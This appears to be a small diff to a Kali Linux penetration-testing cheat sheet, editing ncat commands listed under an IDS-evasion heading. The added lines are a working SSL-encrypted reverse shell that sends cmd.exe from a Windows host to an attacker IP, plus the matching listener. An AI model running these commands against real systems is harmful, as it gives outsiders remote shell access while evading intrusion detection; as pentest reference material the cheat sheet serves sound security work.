@@ -170,10 +170,10 @@ Kali Linux
     IDS
 
     -   Reverse shell from windows using cmd.exe using ssl  
-        `ncat --exec cmd.exe --allow $ip -vnl 4444 --ssl`
+        `ncat --exec cmd.exe $ip 4444 --ssl`
 
-    -   Listen on port 4444 using ssl  
-        `ncat -v $ip 4444 --ssl`
+    -   Listen on port 9999 using ssl  
+        `ncat -vln 9999 --ssl --allow $ip`
 
 
 -   Tcpdump
